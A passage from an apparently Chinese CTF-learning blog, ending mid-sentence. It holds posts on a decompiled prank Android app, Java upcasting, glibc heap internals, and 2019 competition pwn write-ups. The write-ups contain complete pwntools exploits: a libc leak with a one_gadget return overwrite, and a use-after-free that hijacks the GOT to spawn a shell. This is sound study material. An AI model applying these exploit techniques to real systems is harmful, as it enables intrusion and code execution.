<p>然后我们可以拿着这个函数去解密了，但是我发现我把 buf 读出来怎么少了一截？？只好从网上 dang 了点东西，整出来解密后的东西后我就开始了反编译之路，找了好多软件都不好用，不是报错就是嫌这个 lua 版本太新，最后终于找到了<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/unluac/files/latest/download">unluac</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar unluac_2015_06_13.jar main.lua &gt; main_real.lua</span><br></pre></td></tr></table></figure>

<p>终于完事了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">require(&quot;import&quot;)</span><br><span class="line">import(&quot;android.app.*&quot;)</span><br><span class="line">import(&quot;android.os.*&quot;)</span><br><span class="line">import(&quot;android.widget.*&quot;)</span><br><span class="line">import(&quot;android.view.*&quot;)</span><br><span class="line">import(&quot;android.view.View&quot;)</span><br><span class="line">import(&quot;android.content.Context&quot;)</span><br><span class="line">import(&quot;android.media.MediaPlayer&quot;)</span><br><span class="line">import(&quot;android.media.AudioManager&quot;)</span><br><span class="line">import(&quot;com.androlua.Ticker&quot;)</span><br><span class="line">activity.getSystemService(Context.AUDIO_SERVICE).setStreamVolume(AudioManager.STREAM_MUSIC, 15, AudioManager.FLAG_SHOW_UI)</span><br><span class="line">activity.getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_IMMERSIVE)</span><br><span class="line">m = MediaPlayer()</span><br><span class="line">m.reset()</span><br><span class="line">m.setDataSource(activity.getLuaDir() .. &quot;/0.mp3&quot;)</span><br><span class="line">m.prepare()</span><br><span class="line">m.start()</span><br><span class="line">m.setLooping(true)      //单曲循环，真狠啊你是</span><br><span class="line">ti = Ticker()</span><br><span class="line">ti.Period = 10</span><br><span class="line">function ti.onTick()    //重写点击</span><br><span class="line">  activity.getSystemService(Context.AUDIO_SERVICE).setStreamVolume(AudioManager.STREAM_MUSIC, 15, AudioManager.FLAG_SHOW_UI)</span><br><span class="line">  activity.getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_IMMERSIVE)</span><br><span class="line">end</span><br><span class="line">ti.start()</span><br><span class="line">function onKeyDown(A0_0, A1_1)</span><br><span class="line">  if string.find(tostring(A1_1), &quot;KEYCODE_BACK&quot;) ~= nil then    //KEYCODE_BACK返回按键</span><br><span class="line">    activity.getSystemService(Context.AUDIO_SERVICE).setStreamVolume(AudioManager.STREAM_MUSIC, 15, AudioManager.FLAG_SHOW_UI)</span><br><span class="line">  end</span><br><span class="line">  return true</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>可以看到 lua 只是找到了 0.mp3 ，之后疯狂循环，并且瞎写控制函数，然后就没有然后了，咱也不知道 java 里有没有瞎写， app 分析实在太难了~~</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/09/27/2019-09-27-lua_1/" data-id="cuidYZ1fIPsJkadbZIK0LB3dL" data-title="Mysterious app" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2019-09-25-java_1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/09/25/2019-09-25-java_1/" class="article-date">
  <time class="dt-published" datetime="2019-09-24T16:00:00.000Z" itemprop="datePublished">2019-09-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/09/25/2019-09-25-java_1/">Small weak chick</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>说来惭愧，本人从大一到现在一直没有学 java ，莫名其妙对这个极其抵触，现在学计算机网络需要用到了，赶紧磨磨刀吧</p>
<p>感觉目前和 C 不太一样的就是 java 是一门面向对象的语言，和 C++ 一样，但是本人还是喜欢 C 语言这种面向过程的纯粹的语言，很干净，好优雅（个人观点，同时用 java 写的程序只要有 class ，在用 javac 编译后都会生成一个对应的 .class 文件，不明觉厉</p>
<p>第一个程序，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">class father&#123;</span><br><span class="line">	int x;</span><br><span class="line">	String a;</span><br><span class="line">	transient int tmp;</span><br><span class="line">	int temp;</span><br><span class="line">	static void print()</span><br><span class="line">	&#123;</span><br><span class="line">		System.out.println(&quot;I am father&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	void print_1()</span><br><span class="line">	&#123;</span><br><span class="line">		System.out.println(&quot;I am father_1&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">class son extends father&#123;</span><br><span class="line">	static void print()</span><br><span class="line">	&#123;</span><br><span class="line">		System.out.println(&quot;I am son&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	void print_1()</span><br><span class="line">	&#123;</span><br><span class="line">		System.out.println(&quot;I am son_1&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	int y;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class HelloWorld &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">//        System.out.println(&quot;Hello World!&quot;);</span><br><span class="line">		father a;</span><br><span class="line">		a=new son();	</span><br><span class="line">		a.print();</span><br><span class="line">    a.print_1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实 java 还是用起来还是很舒服的，上边这个就是告诉我们一个对象上转型， static 不能重写，默认可以重写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\14555\Desktop&gt;java HelloWorld</span><br><span class="line">I am father</span><br><span class="line">I am son_1</span><br></pre></td></tr></table></figure>

<p>而且倘若要引用子类的 y ，系统提示错误</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\14555\Desktop&gt;javac HelloWorld.java</span><br><span class="line">HelloWorld.java:36: 错误: 找不到符号</span><br><span class="line">                a.y=1;</span><br><span class="line">                 ^</span><br><span class="line">  符号:   变量 y</span><br><span class="line">  位置: 类型为father的变量 a</span><br><span class="line">1 个错误</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/09/25/2019-09-25-java_1/" data-id="cuidvS9umnthXuQFixprpFvqf" data-title="Small weak chick" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2019-09-23-heap_advan" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/09/23/2019-09-23-heap_advan/" class="article-date">
  <time class="dt-published" datetime="2019-09-22T16:00:00.000Z" itemprop="datePublished">2019-09-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/09/23/2019-09-23-heap_advan/">advanced understanding</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Studyed by <strong>走位</strong>,orz</p>
<p>main thread (don’t have <strong>heap_info</strong> just one heap)heap use <strong>brk</strong> (adjoin with data)</p>
<p>use <strong>program break location</strong> to adjust the main arena(global variable)</p>
<p>thread heap use mmap(can contain many heaps)</p>
<ul>
<li>arena -&gt; heap -&gt; chunk</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">struct malloc_state</span><br><span class="line">&#123;</span><br><span class="line">  /* Serialize access.  */</span><br><span class="line">  mutex_t mutex;</span><br><span class="line">  /* Flags (formerly in max_fast).  */</span><br><span class="line">  int flags;</span><br><span class="line">  /* Fastbins */</span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line">  /* Base of the topmost chunk -- not otherwise kept in a bin */</span><br><span class="line">  mchunkptr top;</span><br><span class="line">  /* The remainder from the most recent split of a small request */</span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line">  /* Normal bins packed as described above */</span><br><span class="line">  mchunkptr bins[NBINS * 2 - 2];</span><br><span class="line">  /* Bitmap of bins */</span><br><span class="line">  unsigned int binmap[BINMAPSIZE];</span><br><span class="line">  /* Linked list */</span><br><span class="line">  struct malloc_state *next;</span><br><span class="line">  /* Linked list for free arenas.  */</span><br><span class="line">  struct malloc_state *next_free;</span><br><span class="line">  /* Memory allocated from the system in this arena.  */</span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _heap_info</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr; /* Arena for this heap. */</span><br><span class="line">  struct _heap_info *prev; /* Previous heap. */</span><br><span class="line">  size_t size;   /* Current size in bytes. */</span><br><span class="line">  size_t mprotect_size; /* Size in bytes that has been mprotected</span><br><span class="line">                           PROT_READ|PROT_WRITE.  */</span><br><span class="line">  /* Make sure the following data is properly aligned, particularly</span><br><span class="line">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span><br><span class="line">     MALLOC_ALIGNMENT. */</span><br><span class="line">  char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">struct malloc_chunk &#123;</span><br><span class="line">  /* #define INTERNAL_SIZE_T size_t */</span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */</span><br><span class="line">  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */</span><br><span class="line">  struct malloc_chunk* fd;         /* double links -- used only if free. 这两个指针只在free chunk中存在*/</span><br><span class="line">  struct malloc_chunk* bk;</span><br><span class="line">  /* Only used for large blocks: pointer to next larger size.  */</span><br><span class="line">  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */</span><br><span class="line">  struct malloc_chunk* bk_nextsize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://introspelliam.github.io/2017/09/10/pwn/Linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90%E4%B8%8A/">two picture</a></p>
<h2 id="last-remainder-chunk"><a href="#last-remainder-chunk" class="headerlink" title="last remainder chunk"></a>last remainder chunk</h2><p>when I malloc(small chunk) but my small bin and unsorted bin can not satisfy,I will ergodic binmaps to find the most fit chunk .if this chunk has rest,the rest will be put into unsorted bin and we call it last remainer chunk</p>
<h2 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h2><p>first malloc(fast bin) , system will execute _int_malloc function , it will find that fast bin is null , and small bin is also null , so will execute malloc_consolidate to initialize malloc_state</p>
<blockquote>
<p>malloc_consolidate</p>
</blockquote>
<ul>
<li>initialize malloc_state</li>
<li>initialize bins</li>
</ul>
<blockquote>
<p>malloc_state</p>
</blockquote>
<ul>
<li>bins pointe to themselves</li>
</ul>
<h2 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h2><blockquote>
<p>circulating double linked list</p>
</blockquote>
<p>No restrictions for size</p>
<h2 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h2><blockquote>
<p>smaller than 512 bytes</p>
</blockquote>
<ul>
<li>FIFO</li>
<li>also <code>circulating double linked list</code></li>
<li>need to be merged</li>
<li>16 + 61*8 &#x3D; 508</li>
</ul>
<p>when you free(small bin) , system will check the bin adjoin the other free bin or not , if adjoin ,system will merge them and fall off from small bin , and put them into unsorted bin</p>
<h2 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h2><blockquote>
<p>larged tham 512 bytes</p>
</blockquote>
<p>Sort from big to small in one bin , the largest will be put into front end and the smallest will be rear end</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/09/23/2019-09-23-heap_advan/" data-id="cuid0mkhTvV-A9KxXH7q_q63t" data-title="advanced understanding" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2019-09-08-isc2019" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/09/04/2019-09-08-isc2019/" class="article-date">
  <time class="dt-published" datetime="2019-09-03T16:00:00.000Z" itemprop="datePublished">2019-09-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/09/04/2019-09-08-isc2019/">信息安全竞赛</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="your-pwn"><a href="#your-pwn" class="headerlink" title="your_pwn"></a>your_pwn</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><blockquote>
<p>数组索引不规范</p>
</blockquote>
<p>根据栈中的偏移我们可以得到<code>__libc_start_main</code>的地址,进而得到<code>libc</code>版本,介绍一个神器,他可以根据函数地址偏移来确定版本号,例如我们以这题为例,我们通过本地调试找到栈中存放<code>__libc_start_main + 240</code>的位置,之后到远程打的时候通过这个泄漏出来这个,然后利用神器直接看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 0x830-240</span><br><span class="line">1856</span><br><span class="line">&gt;&gt;&gt; hex(1856)</span><br><span class="line">&#x27;0x740&#x27;</span><br><span class="line">&gt;&gt;&gt; from LibcSearcher import *</span><br><span class="line">&gt;&gt;&gt; obj = LibcSearcher(&quot;__libc_start_main&quot;, 0X740)</span><br><span class="line">&gt;&gt;&gt; obj.dump(&quot;system&quot;)</span><br><span class="line">Multi Results:</span><br><span class="line"> 0: ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)</span><br><span class="line"> 1: archive-glibc (id libc6_2.23-0ubuntu3_amd64)</span><br><span class="line">Please supply more info using </span><br><span class="line">	add_condition(leaked_func, leaked_address).</span><br><span class="line">You can choose it by hand</span><br><span class="line">Or type &#x27;exit&#x27; to quit:</span><br></pre></td></tr></table></figure>
<p>可以看到,直接把libc整出来了,我们看看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># root @ pic-RESCUER-R720-15IKBN in ~/桌面/guosai [11:28:01] </span><br><span class="line">$ nm -D /lib/x86_64-linux-gnu/libc-2.23.so | grep main</span><br><span class="line">000000000002e1a0 W bindtextdomain</span><br><span class="line">000000000002e400 W bind_textdomain_codeset</span><br><span class="line">00000000000fd500 T getdomainname</span><br><span class="line">0000000000118730 T __getdomainname_chk</span><br><span class="line">0000000000071c10 T _IO_switch_to_main_wget_area</span><br><span class="line">000000000018cbc0 R _libc_intl_domainname</span><br><span class="line">0000000000020740 T __libc_start_main</span><br><span class="line">00000000003c93a8 B _nl_domain_bindings</span><br><span class="line">00000000000fd570 T setdomainname</span><br><span class="line">0000000000032620 W textdomain</span><br></pre></td></tr></table></figure>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/8671b34f5620">转自大佬</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    print pidof(p)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">#step1 leak libc_base</span><br><span class="line">p.recvuntil(&#x27;name:&#x27;)</span><br><span class="line">p.sendline(&#x27;test&#x27;)</span><br><span class="line">libc_leak = &#x27;&#x27;</span><br><span class="line">for i in range(637 , 631 , -1):		#从637一个字节一个字节到632(小端存储)获取字节</span><br><span class="line">    p.recvuntil(&#x27;index\n&#x27;)</span><br><span class="line">    p.sendline(str(i))</span><br><span class="line">    p.recvuntil(&#x27;(hex) &#x27;)</span><br><span class="line">    aa = p.recvuntil(&#x27;\n&#x27;)[:-1]</span><br><span class="line">    if(len(aa) &lt; 2):</span><br><span class="line">        libc_leak += &#x27;0&#x27; + aa</span><br><span class="line">    elif(len(aa) == 8):</span><br><span class="line">        libc_leak += aa[-2:]</span><br><span class="line">    else:</span><br><span class="line">        libc_leak += aa</span><br><span class="line">    p.recvuntil(&#x27;value\n&#x27;)</span><br><span class="line">    p.sendline(&#x27;1&#x27;)</span><br><span class="line">print libc_leak</span><br><span class="line">libc.address = int(&#x27;0x&#x27; + libc_leak , 16) - libc.symbols[&#x27;__libc_start_main&#x27;] - 240	# 获取到了后找到基址</span><br><span class="line">success(&#x27;libc_base =&gt; &#x27; + hex(libc.address))</span><br><span class="line">one_gadget = 0xf02a4 + libc.address	# 通过one_gadget直接定位的</span><br><span class="line"></span><br><span class="line">#step2 overwrite EIP to one_gadget</span><br><span class="line">for i in range(6):</span><br><span class="line">    p.recvuntil(&#x27;index\n&#x27;)</span><br><span class="line">    p.sendline(str(i + 344))</span><br><span class="line">    p.recvuntil(&#x27;value\n&#x27;)</span><br><span class="line">    p.sendline(str(ord(p64(one_gadget)[i])))	# 把它写到ret处</span><br><span class="line"></span><br><span class="line">#Get Shell &amp; Have Fun</span><br><span class="line">#debug()</span><br><span class="line">p.sendline(&#x27;a&#x27;)</span><br><span class="line">p.recvuntil(&#x27;(yes/no)? \n&#x27;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>感觉本题最恶心人的就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elif(len(aa) == 8):</span><br><span class="line">    libc_leak += aa[-2:]</span><br></pre></td></tr></table></figure>

<p>本题的循环输入输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">for ( i = 0; i &lt;= 40; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;input index&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  printf(&quot;now value(hex) %x\n&quot;, (unsigned int)v4[v1]);</span><br><span class="line">  puts(&quot;input new value&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v2);</span><br><span class="line">  v4[v1] = v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到在输出时把原来<code>char</code>型转成了<code>unsigned int</code>型，导致会输出一堆<code>ffff</code>，处理方式就是只要后边的倒数1、2位</p>
<p>your_pwn在之前的时候已经解了,具体可以看<a target="_blank" rel="noopener" href="https://pic4xiu.github.io/2019/08/26/re2dlresolve/">这个</a></p>
<p>看了看暑假肝过的堆,怎么一点不记得了,明天赶紧学第二遍</p>
<h1 id="double"><a href="#double" class="headerlink" title="double"></a>double</h1><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">    p = process(&#x27;./double&#x27;)</span><br><span class="line">else:</span><br><span class="line">    p = remote(&#x27;e095ff54e419a6e01532dee4ba86fa9c.kr-lab.com&#x27; , 40002)#nc e095ff54e419a6e01532dee4ba86fa9c.kr-lab.com 40002</span><br><span class="line"></span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)</span><br><span class="line">elf = ELF(&#x27;./double&#x27;)</span><br><span class="line"></span><br><span class="line">def add(data):</span><br><span class="line">    p.recvuntil(&#x27;&gt; &#x27;)</span><br><span class="line">    p.sendline(&#x27;1&#x27;)</span><br><span class="line">    p.recvuntil(&#x27;data:\n&#x27;)</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    p.recvuntil(&#x27;&gt; &#x27;)</span><br><span class="line">    p.sendline(&#x27;2&#x27;)</span><br><span class="line">    p.recvuntil(&#x27;index: &#x27;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    return p.recvuntil(&#x27;\n----&#x27;)[:-5]</span><br><span class="line"></span><br><span class="line">def edit(index , data):</span><br><span class="line">    p.recvuntil(&#x27;&gt; &#x27;)</span><br><span class="line">    p.sendline(&#x27;3&#x27;)</span><br><span class="line">    p.recvuntil(&#x27;index: &#x27;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    sleep(0.1)</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    p.recvuntil(&#x27;&gt; &#x27;)</span><br><span class="line">    p.sendline(&#x27;4&#x27;)</span><br><span class="line">    p.recvuntil(&#x27;index: &#x27;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    print pidof(p)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">#step1 leak libc_base</span><br><span class="line">add(&#x27;a&#x27; * 0x17)         #0</span><br><span class="line">add(&#x27;a&#x27; * 0x17)         #1</span><br><span class="line">delete(0)</span><br><span class="line">add(&#x27;a&#x27; * 0x7f)         #2</span><br><span class="line">add(&#x27;a&#x27; * 0x7f)         #3</span><br><span class="line">add(&#x27;/bin/sh\x00&#x27;)      #4</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">libc.address = u64(show(3).ljust(8 , &#x27;\x00&#x27;)) - 0x3c4b78</span><br><span class="line">system_addr = libc.symbols[&#x27;system&#x27;]</span><br><span class="line">free_got = elf.got[&#x27;free&#x27;]</span><br><span class="line">success(&#x27;libc_base =&gt; &#x27; + hex(libc.address))</span><br><span class="line">success(&#x27;system_addr =&gt; &#x27; + hex(system_addr))</span><br><span class="line">success(&#x27;free_got =&gt; &#x27; + hex(free_got))</span><br><span class="line"></span><br><span class="line">#step2 use UAF to change free_got to system_addr</span><br><span class="line">fake_header = p32(0x3) + p32(0x7f)</span><br><span class="line">payload = fake_header + p64(free_got)</span><br><span class="line">edit(1 , payload)</span><br><span class="line">edit(3 , p64(system_addr))</span><br><span class="line">debug()</span><br><span class="line">#Get Shell &amp; Have Fun</span><br><span class="line">delete(4)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="解读"><a href="#解读" class="headerlink" title="解读"></a>解读</h2><p>本题漏洞点在</p>
